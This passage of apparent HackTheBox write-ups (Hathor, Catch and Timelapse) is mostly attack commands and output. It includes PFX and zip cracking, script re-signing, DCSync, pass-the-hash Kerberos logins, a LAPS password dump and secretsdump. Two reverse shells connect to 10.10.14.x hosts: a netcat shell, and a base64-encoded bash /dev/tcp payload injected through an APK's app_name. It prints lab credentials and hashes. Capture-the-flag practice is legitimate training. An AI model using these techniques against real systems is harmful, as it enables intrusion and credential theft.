12345678910c:\\$Recycle.Bin\\S-1-5-21-3783586571-2109290616-3725730865-2663&gt;copy * \\share\\crackpkcs12 -d /usr/share/wordlists/rockyou.txt \\$RLYS3KF.pfxabceasyas123crackpkcs12 -d /usr/share/wordlists/rockyou.txt \\$RZIX7VV.pfxwhysoeasy? 然后使用密码提取证书： 123openssl pkcs12 -info -in \\$RLYS3KF.pfx -nooutopenssl pkcs12 -in \\$RLYS3KF.pfx -out cert.pem -nokeysopenssl x509 -in cert.pem -noout -text 关键信息： subject是DC = htb, DC = windcorp, CN = Users, CN = Administrator。这与上面 Exe（未显示）和脚本的 AppLocker 数据中的内容相匹配： 该证书用于代码签名： Get-bADpasswords该Get-bADpasswords脚本必须有权访问域密码才能完成它的工作，因此它很可能以某种特权用户身份运行。我知道它运行C:\\Get-bADpasswords.ps1脚本，该脚本已签名，因此它将运行。我知道可以访问签名密钥，所以理论上我可以修改脚本并执行 我将复制Get-bADpasswords.ps1到 SMB 共享以获取它的副本。我必须更改.ps1从该文件夹中阻止的扩展名： 1copy Get-bADpasswords.ps1 \\share\\gbp.txt 我将下载脚本，并在顶部添加一行，打印有关运行脚本的用户的详细信息： 1whoami &#x2F;all &gt; C:\\Programdata\\0xdf.txt 现在我需要签署脚本，因为修改它会使旧签名无效。我将首先将证书导入我的用户的证书存储区并获取对它的引用$cert： 12345PS C:\\&gt; $pass &#x3D; ConvertTo-SecureString -String &#39;abceasyas123&#39; -AsPlainText -ForcePS C:\\get-badpasswords&gt; $cert &#x3D; Import-PfxCertificate -FilePath &#39;C:\\$Recycle.bin\\S-1-5-21-3783586571-2109290616-3725730865-2663\\$RLYS3KF.pfx&#39; -Password $pass -CertStoreLocation Cert:\\CurrentUser\\MyPS C:\\get-badpasswords&gt; $cert 现在我可以用它来签署文件了： 1PS C:\\get-badpasswords&gt; Set-AuthenticodeSignature .\\Get-bADpasswords.ps1 $cert 要触发执行，我将运行run.vbs： 1PS C:\\get-badpasswords&gt; cscript .\\run.vbs 现在有一个文件C:\\programdata,它显示用户不是域管理员，而是 bpassrunner： 12345678910PS C:\\programdata&gt; cat 0xdf.txtUSER INFORMATION----------------User Name SID ==================== ===============================================windcorp\\bpassrunner S-1-5-21-3783586571-2109290616-3725730865-10102...[snip]... bpassrunner我花了一点时间才弄清楚如何将它变成一个 shell。我不能只nc64.exe从 Web 目录调用，因为它不会通过 AppLocker。我不能使用 PowerShell，因为即使我可以对其进行签名并且它会运行，防火墙也会阻止出站连接。 然后我意识到我可以尝试覆盖bginfo64.exe并nc64.exe从那里运行它。尝试这样做时，它失败了，因为该文件仍在使用中——我当前的 shell！这意味着它实际上是静止的nc64.exe。 我会将脚本本地副本的顶部更新为： 1C:\\share\\Bginfo64.exe -e cmd 10.10.14.6 9004 我将上传它、签名并触发它。大约 15 秒后，我得到一个 shell 12C:\\Get-bADpasswords&gt;whoamiwindcorp\\bpassrunner 提权信息Get-bADpasswords GitHub README说运行它： 需要“域管理员”权限或类似权限，例如“域控制器”或“复制目录更改”和“复制目录更改全部”的委派域级权限，才能成功从 Active Directory 数据库中获取密码。 这意味着该用户应该能够运行 DCSync 攻击。 dcsync这实际上很容易从 shell 中作为具有权限的用户使用Get-ADReplAccount： 123Get-ADReplAccount -SamAccountName administrator -Server &#39;hathor.windcorp.htb&#39;NTHash: b3ff8d7532eef396a5347ed33933030f 如果由于某种原因我无法获得 shell，我仍然可以通过脚本注入来完成此操作。我会将以下三行添加到我的本地副本的开头Get-bADpasswords.ps1： 123Start-Transcript -Path 'C:\\Programdata\\0xdf-transcript.txt'Get-ADReplAccount -SamAccountName administrator -Server 'hathor.windcorp.htb'Stop-Transcript 提权 &amp; root flag现在我们有Administrator的hash，仍然需要通过kerberos方式： Kerberos 授权123456789└─$ ktutilktutil: add_entry -p administrator@WINDCORP.HTB -k 1 -key -e rc4-hmacKey for administrator@WINDCORP.HTB (hex): b3ff8d7532eef396a5347ed33933030fktutil: write_kt administrator.keytabktutil: exitkinit -V -k -t administrator.keytab -f administrator@WINDCORP.HTBklist 也可以使用impacket的getTGT来通过hash获取票据： 1getTGT.py -hashes :b3ff8d7532eef396a5347ed33933030f windcorp.htb/administrator shell得到票据之后，即可任意可用方式获得shell： 123456evil-winrm -i hathor.windcorp.htb -r WINDCORP.HTB# orKRB5CCNAME=./administrator.ccache evil-winrm -i hathor.windcorp.htb -r WINDCORP.HTBKRB5CCNAME=./administrator.ccache wmiexec.py windcorp.htb/administrator@hathor.windcorp.htb -k -no-pass flags12type C:\\Users\\GinaWild\\desktop\\user.txttype C:\\Users\\Administrator\\desktop\\root.txt 参考资料 Admin Password Reset - mojoPortalhttps://www.mojoportal.com/Forums/Thread.aspx?pageid=5&amp;t=2902~-1#:~:text=Enter%20%22admin%40admin.com,and%20%22admin%22%20for%20Password. Vulnerabilities in Legacy File Manager · Issue #146 · i7MEDIA/mojoportalhttps://github.com/i7MEDIA/mojoportal/issues/146 Enumerating Firewall And AppLocker Rules [Hathor - HackTheBox] - YouTubehttps://www.youtube.com/watch?v=w_Kro3S4xE8&amp;ab_channel=0xdf improsec/Get-bADpasswords: Get insights into the actual strength and quality of passwords in Active Directory.https://github.com/improsec/Get-bADpasswords crackpkcs12/crackpkcs12: A multithreaded program to crack PKCS#12 files (p12 and pfx extensions)https://github.com/crackpkcs12/crackpkcs12 HTB: Hathor | 0xdf hacks stuffhttps://0xdf.gitlab.io/2022/11/19/htb-hathor.html HackTheBox - Hathor - YouTubehttps://www.youtube.com/watch?v=yweDaXZdt4s&amp;ab_channel=IppSec","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"Catch - HackTheBox","slug":"Catch-HackTheBox","date":"2022-04-08T06:50:35.000Z","updated":"2022-07-25T01:35:53.813Z","comments":true,"path":"2022/04/08/Catch-HackTheBox/","link":"","permalink":"https://darkwing.moe/2022/04/08/Catch-HackTheBox/","excerpt":"","text":"基本信息 https://www.hackthebox.com/home/machines/profile/450 10.10.11.150 端口扫描22,80,3000,5000,8000: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159$ nmap -sC -sV 10.10.11.150Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-08 13:28 CSTNmap scan report for 10.10.11.150Host is up (0.20s latency).Not shown: 995 closed tcp ports (conn-refused)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:| 3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)| 256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)|_ 256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)80/tcp open http Apache httpd 2.4.41 ((Ubuntu))|_http-title: Catch Global Systems|_http-server-header: Apache/2.4.41 (Ubuntu)3000/tcp open ppp?| fingerprint-strings:| GenericLines, Help, RTSPRequest:| HTTP/1.1 400 Bad Request| Content-Type: text/plain; charset=utf-8| Connection: close| Request| GetRequest:| HTTP/1.0 200 OK| Content-Type: text/html; charset=UTF-8| Set-Cookie: i_like_gitea=cae8621f0dff94e3; Path=/; HttpOnly| Set-Cookie: _csrf=7M4wTONaVHZ3hEuwqiFsqOLml-Y6MTY0OTM5NTc1NzMxOTI1Mzc4NQ; Path=/; Expires=Sat, 09 Apr 2022 05:29:17 GMT; HttpOnly; SameSite=Lax| Set-Cookie: macaron_flash=; Path=/; Max-Age=0; HttpOnly| X-Frame-Options: SAMEORIGIN| Date: Fri, 08 Apr 2022 05:29:17 GMT| &lt;!DOCTYPE html&gt;| &lt;html lang=\"en-US\" class=\"theme-\"&gt;| &lt;head data-suburl=\"\"&gt;| &lt;meta charset=\"utf-8\"&gt;| &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1\"&gt;| &lt;meta http-equiv=\"x-ua-compatible\" content=\"ie=edge\"&gt;| &lt;title&gt; Catch Repositories &lt;/title&gt;| &lt;link rel=\"manifest\" href=\"data:application/json;base64,eyJuYW1lIjoiQ2F0Y2ggUmVwb3NpdG9yaWVzIiwic2hvcnRfbmFtZSI6IkNhdGNoIFJlcG9zaXRvcmllcyIsInN0YXJ0X3VybCI6Imh0dHA6Ly9naXRlYS5jYXRjaC5odGI6MzAwMC8iLCJpY29ucyI6W3sic3JjIjoiaHR0cDovL2dpdGVhLmNhdGNoLmh0Yjoz| HTTPOptions:| HTTP/1.0 405 Method Not Allowed| Set-Cookie: i_like_gitea=3310d23dba07b622; Path=/; HttpOnly| Set-Cookie: _csrf=gfXxdWe0pNU-2yj7CJmpTYTBtQ46MTY0OTM5NTc2MzM3MTk3ODkzMA; Path=/; Expires=Sat, 09 Apr 2022 05:29:23 GMT; HttpOnly; SameSite=Lax| Set-Cookie: macaron_flash=; Path=/; Max-Age=0; HttpOnly| X-Frame-Options: SAMEORIGIN| Date: Fri, 08 Apr 2022 05:29:23 GMT|_ Content-Length: 05000/tcp open upnp?| fingerprint-strings:| DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, RPCCheck, RTSPRequest, SMBProgNeg, ZendJavaBridge:| HTTP/1.1 400 Bad Request| Connection: close| GetRequest:| HTTP/1.1 302 Found| X-Frame-Options: SAMEORIGIN| X-Download-Options: noopen| X-Content-Type-Options: nosniff| X-XSS-Protection: 1; mode=block| Content-Security-Policy:| X-Content-Security-Policy:| X-WebKit-CSP:| X-UA-Compatible: IE=Edge,chrome=1| Location: /login| Vary: Accept, Accept-Encoding| Content-Type: text/plain; charset=utf-8| Content-Length: 28| Set-Cookie: connect.sid=s%3AXXp6I72QuCEosvZoFuxBEZ0bpCuwBcMr.yyPLpvTFJxYads2rdwaRU3nMijrdq4miYZLeG3SGuIU; Path=/; HttpOnly| Date: Fri, 08 Apr 2022 05:29:22 GMT| Connection: close| Found. Redirecting to /login| HTTPOptions:| HTTP/1.1 200 OK| X-Frame-Options: SAMEORIGIN| X-Download-Options: noopen| X-Content-Type-Options: nosniff| X-XSS-Protection: 1; mode=block| Content-Security-Policy:| X-Content-Security-Policy:| X-WebKit-CSP:| X-UA-Compatible: IE=Edge,chrome=1| Allow: GET,HEAD| Content-Type: text/html; charset=utf-8| Content-Length: 8| ETag: W/\"8-ZRAf8oNBS3Bjb/SU2GYZCmbtmXg\"| Set-Cookie: connect.sid=s%3AaOwhTa3pPTNrGsrD5qPMN7SaVBU9Jxpm.G3CN12m3ivfC%2B9bHgwJ0Svaec%2FJWqcT9Ija4G7ZVCdc; Path=/; HttpOnly| Vary: Accept-Encoding| Date: Fri, 08 Apr 2022 05:29:24 GMT| Connection: close|_ GET,HEAD8000/tcp open http Apache httpd 2.4.29 ((Ubuntu))|_http-server-header: Apache/2.4.29 (Ubuntu)|_http-title: Catch Global Systems2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============SF-Port3000-TCP:V=7.92%I=7%D=4/8%Time=624FC82C%P=x86_64-apple-darwin20.4.0SF:%r(GenericLines,67,\"HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nContent-Type:SF:\\x20text/plain;\\x20charset=utf-8\\r\\nConnection:\\x20close\\r\\n\\r\\n400\\x20SF:Bad\\x20Request\")%r(GetRequest,30E3,\"HTTP/1\\.0\\x20200\\x20OK\\r\\nContent-TSF:ype:\\x20text/html;\\x20charset=UTF-8\\r\\nSet-Cookie:\\x20i_like_gitea=cae8SF:621f0dff94e3;\\x20Path=/;\\x20HttpOnly\\r\\nSet-Cookie:\\x20_csrf=7M4wTONaVHSF:Z3hEuwqiFsqOLml-Y6MTY0OTM5NTc1NzMxOTI1Mzc4NQ;\\x20Path=/;\\x20Expires=SatSF:,\\x2009\\x20Apr\\x202022\\x2005:29:17\\x20GMT;\\x20HttpOnly;\\x20SameSite=LaxSF:\\r\\nSet-Cookie:\\x20macaron_flash=;\\x20Path=/;\\x20Max-Age=0;\\x20HttpOnlySF:\\r\\nX-Frame-Options:\\x20SAMEORIGIN\\r\\nDate:\\x20Fri,\\x2008\\x20Apr\\x20202SF:2\\x2005:29:17\\x20GMT\\r\\n\\r\\n&lt;!DOCTYPE\\x20html&gt;\\n&lt;html\\x20lang=\\\"en-US\\\"SF:\\x20class=\\\"theme-\\\"&gt;\\n&lt;head\\x20data-suburl=\\\"\\\"&gt;\\n\\t&lt;meta\\x20charset=\\SF:\"utf-8\\\"&gt;\\n\\t&lt;meta\\x20name=\\\"viewport\\\"\\x20content=\\\"width=device-widthSF:,\\x20initial-scale=1\\\"&gt;\\n\\t&lt;meta\\x20http-equiv=\\\"x-ua-compatible\\\"\\x20cSF:ontent=\\\"ie=edge\\\"&gt;\\n\\t&lt;title&gt;\\x20Catch\\x20Repositories\\x20&lt;/title&gt;\\n\\tSF:&lt;link\\x20rel=\\\"manifest\\\"\\x20href=\\\"data:application/json;base64,eyJuYWSF:1lIjoiQ2F0Y2ggUmVwb3NpdG9yaWVzIiwic2hvcnRfbmFtZSI6IkNhdGNoIFJlcG9zaXRvcSF:mllcyIsInN0YXJ0X3VybCI6Imh0dHA6Ly9naXRlYS5jYXRjaC5odGI6MzAwMC8iLCJpY29uSF:cyI6W3sic3JjIjoiaHR0cDovL2dpdGVhLmNhdGNoLmh0Yjoz\")%r(Help,67,\"HTTP/1\\.1SF:\\x20400\\x20Bad\\x20Request\\r\\nContent-Type:\\x20text/plain;\\x20charset=utSF:f-8\\r\\nConnection:\\x20close\\r\\n\\r\\n400\\x20Bad\\x20Request\")%r(HTTPOptionSF:s,17F,\"HTTP/1\\.0\\x20405\\x20Method\\x20Not\\x20Allowed\\r\\nSet-Cookie:\\x20iSF:_like_gitea=3310d23dba07b622;\\x20Path=/;\\x20HttpOnly\\r\\nSet-Cookie:\\x20SF:_csrf=gfXxdWe0pNU-2yj7CJmpTYTBtQ46MTY0OTM5NTc2MzM3MTk3ODkzMA;\\x20Path=/SF:;\\x20Expires=Sat,\\x2009\\x20Apr\\x202022\\x2005:29:23\\x20GMT;\\x20HttpOnly;SF:\\x20SameSite=Lax\\r\\nSet-Cookie:\\x20macaron_flash=;\\x20Path=/;\\x20Max-AgSF:e=0;\\x20HttpOnly\\r\\nX-Frame-Options:\\x20SAMEORIGIN\\r\\nDate:\\x20Fri,\\x20SF:08\\x20Apr\\x202022\\x2005:29:23\\x20GMT\\r\\nContent-Length:\\x200\\r\\n\\r\\n\")%SF:r(RTSPRequest,67,\"HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nContent-Type:\\xSF:20text/plain;\\x20charset=utf-8\\r\\nConnection:\\x20close\\r\\n\\r\\n400\\x20BaSF:d\\x20Request\");==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============SF-Port5000-TCP:V=7.92%I=7%D=4/8%Time=624FC831%P=x86_64-apple-darwin20.4.0SF:%r(GetRequest,23A,\"HTTP/1\\.1\\x20302\\x20Found\\r\\nX-Frame-Options:\\x20SAMSF:EORIGIN\\r\\nX-Download-Options:\\x20noopen\\r\\nX-Content-Type-Options:\\x20SF:nosniff\\r\\nX-XSS-Protection:\\x201;\\x20mode=block\\r\\nContent-Security-PoSF:licy:\\x20\\r\\nX-Content-Security-Policy:\\x20\\r\\nX-WebKit-CSP:\\x20\\r\\nX-USF:A-Compatible:\\x20IE=Edge,chrome=1\\r\\nLocation:\\x20/login\\r\\nVary:\\x20AcSF:cept,\\x20Accept-Encoding\\r\\nContent-Type:\\x20text/plain;\\x20charset=utfSF:-8\\r\\nContent-Length:\\x2028\\r\\nSet-Cookie:\\x20connect\\.sid=s%3AXXp6I72QSF:uCEosvZoFuxBEZ0bpCuwBcMr\\.yyPLpvTFJxYads2rdwaRU3nMijrdq4miYZLeG3SGuIU;\\SF:x20Path=/;\\x20HttpOnly\\r\\nDate:\\x20Fri,\\x2008\\x20Apr\\x202022\\x2005:29:2SF:2\\x20GMT\\r\\nConnection:\\x20close\\r\\n\\r\\nFound\\.\\x20Redirecting\\x20to\\x2SF:0/login\")%r(RTSPRequest,2F,\"HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nConneSF:ction:\\x20close\\r\\n\\r\\n\")%r(DNSVersionBindReqTCP,2F,\"HTTP/1\\.1\\x20400\\xSF:20Bad\\x20Request\\r\\nConnection:\\x20close\\r\\n\\r\\n\")%r(SMBProgNeg,2F,\"HTTSF:P/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nConnection:\\x20close\\r\\n\\r\\n\")%r(ZenSF:dJavaBridge,2F,\"HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nConnection:\\x20clSF:ose\\r\\n\\r\\n\")%r(HTTPOptions,245,\"HTTP/1\\.1\\x20200\\x20OK\\r\\nX-Frame-OptiSF:ons:\\x20SAMEORIGIN\\r\\nX-Download-Options:\\x20noopen\\r\\nX-Content-Type-OSF:ptions:\\x20nosniff\\r\\nX-XSS-Protection:\\x201;\\x20mode=block\\r\\nContent-SF:Security-Policy:\\x20\\r\\nX-Content-Security-Policy:\\x20\\r\\nX-WebKit-CSP:SF:\\x20\\r\\nX-UA-Compatible:\\x20IE=Edge,chrome=1\\r\\nAllow:\\x20GET,HEAD\\r\\nCSF:ontent-Type:\\x20text/html;\\x20charset=utf-8\\r\\nContent-Length:\\x208\\r\\nSF:ETag:\\x20W/\\\"8-ZRAf8oNBS3Bjb/SU2GYZCmbtmXg\\\"\\r\\nSet-Cookie:\\x20connect\\SF:.sid=s%3AaOwhTa3pPTNrGsrD5qPMN7SaVBU9Jxpm\\.G3CN12m3ivfC%2B9bHgwJ0Svaec%SF:2FJWqcT9Ija4G7ZVCdc;\\x20Path=/;\\x20HttpOnly\\r\\nVary:\\x20Accept-EncodingSF:\\r\\nDate:\\x20Fri,\\x2008\\x20Apr\\x202022\\x2005:29:24\\x20GMT\\r\\nConnectionSF::\\x20close\\r\\n\\r\\nGET,HEAD\")%r(RPCCheck,2F,\"HTTP/1\\.1\\x20400\\x20Bad\\x20SF:Request\\r\\nConnection:\\x20close\\r\\n\\r\\n\")%r(DNSStatusRequestTCP,2F,\"HTTSF:P/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nConnection:\\x20close\\r\\n\\r\\n\")%r(HelSF:p,2F,\"HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nConnection:\\x20close\\r\\n\\r\\SF:n\");Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 152.22 seconds 80主站，提供一个apk下载： 3000gitea 1.14.1： 5000lets chat: 8000Cachet: catchv1.0.apkapk反编译，其中有几个硬编码的token： 123&lt;string name=\"gitea_token\"&gt;b87bfb6345ae72ed5ecdcee05bcb34c83806fbd0&lt;/string&gt;&lt;string name=\"lets_chat_token\"&gt;NjFiODZhZWFkOTg0ZTI0NTEwMzZlYjE2OmQ1ODg0NjhmZjhiYWU0NDYzNzlhNTdmYTJiNGU2M2EyMzY4MjI0MzM2YjU5NDljNQ==&lt;/string&gt;&lt;string name=\"slack_token\"&gt;xoxp-23984754863-2348975623103&lt;/string&gt; lets-chat根据文档，使用token调用API, 在其中一个room中得到一组账号密码,并且根据status的域名可以知道应该是8000端口那里的： API · sdelements/lets-chat Wikihttps://github.com/sdelements/lets-chat/wiki/API 123456789101112curl -H \"Authorization: bearer NjFiODZhZWFkOTg0ZTI0NTEwMzZlYjE2OmQ1ODg0NjhmZjhiYWU0NDYzNzlhNTdmYTJiNGU2M2EyMzY4MjI0MzM2YjU5NDljNQ==\" \"http://10.10.11.150:5000/rooms\" | jqcurl -H \"Authorization: bearer NjFiODZhZWFkOTg0ZTI0NTEwMzZlYjE2OmQ1ODg0NjhmZjhiYWU0NDYzNzlhNTdmYTJiNGU2M2EyMzY4MjI0MzM2YjU5NDljNQ==\" \"http://10.10.11.150:5000/rooms/61b86b28d984e2451036eb17/messages\" | jq&#123; \"id\": \"61b8702dfe190b466d476bfa\", \"text\": \"Here are the credentials `john : E&#125;V!mywu_69T4C&#125;W`\", \"posted\": \"2021-12-14T10:21:33.859Z\", \"owner\": \"61b86f15fe190b466d476bf5\", \"room\": \"61b86b28d984e2451036eb17\" &#125;, status.catch.htb cachet得到的账号密码登录8000端口的Cachet，设置里得到版本号，2.4.0-dev： 可以搜到相关漏洞： Cachet 2.4: Code Execution via Laravel Configuration Injectionhttps://blog.sonarsource.com/cachet-code-execution-via-laravel-configuration-injection CVE-2021-39174这里可以利用其中的一个，来获取配置文件相关信息，修改，保存，再去查看就能够获取到配置数据： 12$&#123;DB_USERNAME&#125; will$&#123;DB_PASSWORD&#125; s2#4Fg0_%3! user flag上面得到的账号密码ssh登录，得到user.txt: 提权信息/opt/mdm/verify.sh，其中app_check函数从apk中获取APP_NAME后拼接，存在命令注入： /opt/mdm/verify.sh1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586#!/bin/bash#################### Signature Check ####################sig_check() &#123; jarsigner -verify \"$1/$2\" 2&gt;/dev/null &gt;/dev/null if [[ $? -eq 0 ]]; then echo '[+] Signature Check Passed' else echo '[!] Signature Check Failed. Invalid Certificate.' cleanup exit fi&#125;######################## Compatibility Check ########################comp_check() &#123; apktool d -s \"$1/$2\" -o $3 2&gt;/dev/null &gt;/dev/null COMPILE_SDK_VER=$(grep -oPm1 \"(?&lt;=compileSdkVersion=\\\")[^\\\"]+\" \"$PROCESS_BIN/AndroidManifest.xml\") if [ -z \"$COMPILE_SDK_VER\" ]; then echo '[!] Failed to find target SDK version.' cleanup exit else if [ $COMPILE_SDK_VER -lt 18 ]; then echo \"[!] APK Doesn't meet the requirements\" cleanup exit fi fi&#125;##################### Basic App Checks #####################app_check() &#123; APP_NAME=$(grep -oPm1 \"(?&lt;=&lt;string name=\\\"app_name\\\"&gt;)[^&lt;]+\" \"$1/res/values/strings.xml\") echo $APP_NAME if [[ $APP_NAME == *\"Catch\"* ]]; then echo -n $APP_NAME|xargs -I &#123;&#125; sh -c 'mkdir &#123;&#125;' mv \"$3/$APK_NAME\" \"$2/$APP_NAME/$4\" else echo \"[!] App doesn't belong to Catch Global\" cleanup exit fi&#125;############ Cleanup ############cleanup() &#123; rm -rf $PROCESS_BIN;rm -rf \"$DROPBOX/*\" \"$IN_FOLDER/*\";rm -rf $(ls -A /opt/mdm | grep -v apk_bin | grep -v verify.sh)&#125;#################### MDM CheckerV1.0 ####################DROPBOX=/opt/mdm/apk_binIN_FOLDER=/root/mdm/apk_binOUT_FOLDER=/root/mdm/certified_appsPROCESS_BIN=/root/mdm/process_binfor IN_APK_NAME in $DROPBOX/*.apk;do OUT_APK_NAME=\"$(echo $&#123;IN_APK_NAME##*/&#125; | cut -d '.' -f1)_verified.apk\" APK_NAME=\"$(openssl rand -hex 12).apk\" if [[ -L \"$IN_APK_NAME\" ]]; then exit else mv \"$IN_APK_NAME\" \"$IN_FOLDER/$APK_NAME\" fi sig_check $IN_FOLDER $APK_NAME comp_check $IN_FOLDER $APK_NAME $PROCESS_BIN app_check $PROCESS_BIN $OUT_FOLDER $IN_FOLDER $OUT_APK_NAMEdonecleanup 提权 &amp; root flag修改apk，在appname里注入命令,重新打包后签名,然后将生成的apk上传到对应目录，等待命令执行： 1234567891011121314echo '/bin/bash -i &gt;&amp; /dev/tcp/10.10.14.13/4444 0&gt;&amp;1' | base64L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjEzLzQ0NDQgMD4mMQo=&lt;string name=\"app_name\"&gt;Catch|echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjEzLzQ0NDQgMD4mMQo= | base64 -d | bash&lt;/string&gt;java -jar /usr/local/Cellar/apktool/2.6.1/libexec/apktool_2.6.1.jar d catchv1.0.apkjava -jar /usr/local/Cellar/apktool/2.6.1/libexec/apktool_2.6.1.jar b -f -d catchv1.0 -o catchv2.0.apkkeytool -genkey -v -keystore my-release-key.keystore -alias alias_name -keyalg RSA -keysize 2048 -validity 10000jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore my-release-key.keystore catchv2.0.apk alias_namejarsigner -verify -verbose -certs catchv2.0.apkcp catchv2.0.apk /opt/mdm/apk_bin root flag shadow12root:$6$HJWtdM63SqnL6alL$h&#x2F;FUZ0TNaCCrCgEzeuT9ityQcDmYcMCA0fErrvkZVBmf0TQJntGSRMDo.AXZA9V00.qAsZ04554.dUJcFszUM1:18976:0:99999:7:::will:$6$UlC1gE5S4qWU4bz8$XLnV0mDyqZ61IwRXwC8CGLfaVbF9bJ7uMerWNz1FvjqHShP0spDJmw3O.Iz7Zt7jbvH6X4w2N9PIV6NL6Hhjy.:18976:0:99999:7::: 参考资料 API · sdelements/lets-chat Wikihttps://github.com/sdelements/lets-chat/wiki/API Cachet 2.4: Code Execution via Laravel Configuration Injectionhttps://blog.sonarsource.com/cachet-code-execution-via-laravel-configuration-injection Hackthebox - Catch 靶场实战https://mp.weixin.qq.com/s/Nf4RP6xu7ik_qAB3zYzLBA HTB catch discussion | BreachForumshttps://breached.co/Thread-HTB-catch-discussion","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"Timelapse - HackTheBox","slug":"Timelapse-HackTheBox","date":"2022-04-07T06:30:30.000Z","updated":"2022-08-22T00:34:37.882Z","comments":true,"path":"2022/04/07/Timelapse-HackTheBox/","link":"","permalink":"https://darkwing.moe/2022/04/07/Timelapse-HackTheBox/","excerpt":"","text":"基本信息 https://www.hackthebox.com/home/machines/profile/452 10.10.11.152 端口扫描明显的windows域机器： 12345678910111213141516171819202122232425262728$ nmap -sC -sV -Pn 10.10.11.152Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-07 13:32 CSTNmap scan report for 10.10.11.152Host is up (0.19s latency).Not shown: 991 filtered tcp ports (no-response)PORT STATE SERVICE VERSION53/tcp open domain Simple DNS Plus88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2022-04-07 13:34:30Z)135/tcp open msrpc Microsoft Windows RPC139/tcp open netbios-ssn Microsoft Windows netbios-ssn389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)445/tcp open microsoft-ds?464/tcp open kpasswd5?593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0636/tcp open tcpwrappedService Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windowsHost script results:| smb2-security-mode:| 3.1.1:|_ Message signing enabled and required| smb2-time:| date: 2022-04-07T13:34:50|_ start_date: N/A|_clock-skew: 7h59m58sService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 163.96 seconds SMBsmb未授权访问，有个shares： Shares两个目录，dev里是winrm backup，HelpDesk里是LAPS相关文件： winrm_backup.zip压缩包有密码，可以破解出来: 123zip2john winrm_backup.zip &gt; hash.txtsudo john --wordlist=/usr/share/wordlists/rockyou.txt hash.txtsupremelegacy 解压出来一个pfx证书文件，同样需要密码，john破解： 123pfx2john legacyy_dev_auth.pfx &gt; hash2.txtsudo john --wordlist=/usr/share/wordlists/rockyou.txt hash2.txtthuglegacy 根据文件名，可以知道这个文件是连接winrm所需的认证证书文件，所以就是从pfx文件提取出key后通过winrm连接 user flag 提取出key，提示输入密码的地方均使用破解出的证书密码： 1234openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out priv.keyopenssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokeys -out pfx.crtevil-winrm -i 10.10.11.152 -c ./pfx.crt -k ./priv.key -p -u -S 提权信息运行winpeas之类的，可以在powershell命令历史文件中发现一个密码： 123456789101112type C:\\Users\\legacyy\\appdata\\roaming\\microsoft\\windows\\powershell\\psreadline\\consolehost_history.txtwhoamiipconfig /allnetstat -ano |select-string LIST$so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck$p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force$c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)invoke-command -computername localhost -credential $c -port 5986 -usessl -SessionOption $so -scriptblock &#123;whoami&#125;get-aduser -filter * -properties *exit laps前面可以看到laps相关，后续就是使用svc_deploy账号去dump laps： How To Export LAPS Passwords from Active Directory with Powershell - Smart Home Pursuitshttps://smarthomepursuits.com/export-laps-passwords-powershell/ n00py/LAPSDumper: Dumping LAPS from Pythonhttps://github.com/n00py/LAPSDumper 123456evil-winrm -i 10.10.11.152 -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV' -S$Computers = Get-ADComputer -Filter * -Properties ms-Mcs-AdmPwd, ms-Mcs-AdmPwdExpirationTime$Computers | Sort-Object ms-Mcs-AdmPwdExpirationTime | Format-Table -AutoSize Name, DnsHostName, ms-Mcs-AdmPwd, ms-Mcs-AdmPwdExpirationTimeDC01 dc01.timelapse.htb kF5xw4;8rU#Tv0xn2O#&#123;v0Pl 132942063964961821 root flaglaps得到的密码就是Administrator密码，root.txt在TRX桌面： hashes123456789101112131415161718192021└─$ impacket-secretsdump -just-dc-ntlm Administrator@10.10.11.152Impacket v0.9.24 - Copyright 2021 SecureAuth CorporationPassword:[*] Dumping Domain Credentials 